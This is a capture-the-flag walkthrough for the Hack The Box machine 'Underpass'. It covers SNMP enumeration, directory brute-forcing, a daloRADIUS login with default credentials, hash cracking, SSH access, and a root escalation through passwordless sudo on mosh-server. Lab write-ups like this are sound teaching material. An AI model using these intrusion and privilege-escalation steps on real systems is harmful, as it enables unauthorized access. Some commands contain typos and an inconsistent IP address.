<img src="Images/image1.png" alt="error loading image"> 


## Underpass

Apply a Nmap UDP scan

`nmap -sU --top-port=100 10.10.11.32`

<img src="Images/image2.jpg" alt="error loading image"> 

Let apply snmp enumeration using Metasploit

```
auxiliary/scanner/snmp/snmp_enum

set rhosts 10.10.11.48

run
```

<img src="Images/image3.jpg" alt="error loading image"> 

Here we can see daloradius server. After google search we have some url looking like

`http://underpass.htb/daloradius/`

but when I go to this path it show not found. So we use dirsearch to find hidden director and 
files

command: `dirsearch -u "http://underpass.htb/daloradius/" -t 50`

<img src="Images/image4.jpg" alt="error loading image"> 

Now when we move to app it how show

<img src="Images/image5.jpg" alt="error loading image"> 

Let we further brute force

<img src="Images/image6.jpg" alt="error loading image"> 

Go to login page

<img src="Images/image7.jpg" alt="error loading image"> 

Go with default credential for dalorradius **administrator:radius**

<img src="Images/image8.jpg" alt="error loading image"> 

Go to userlist

<img src="Images/image9.jpg" alt="error loading image"> 

Crash password hash and we have a plain username and password

<img src="Images/image10.jpg" alt="error loading image"> 

We have port 22 open try ssh login

`sh svcMosh@10.10.11.48`

Password: `<password here>`

<img src="Images/image11.jpg" alt="error loading image"> 

And we have a user hash

To find a root hash

First check a sudo priviledge `sudo -l`

<img src="Images/image12.jpg" alt="error loading image"> 

As there is no password require for /usr/bin/mosh-server so run it with sudo priviledge

`mosh --server="sudo /usr/bin/mosh-server" localhost`

we have

<img src="Images/image13.jpg" alt="error loading image"> 















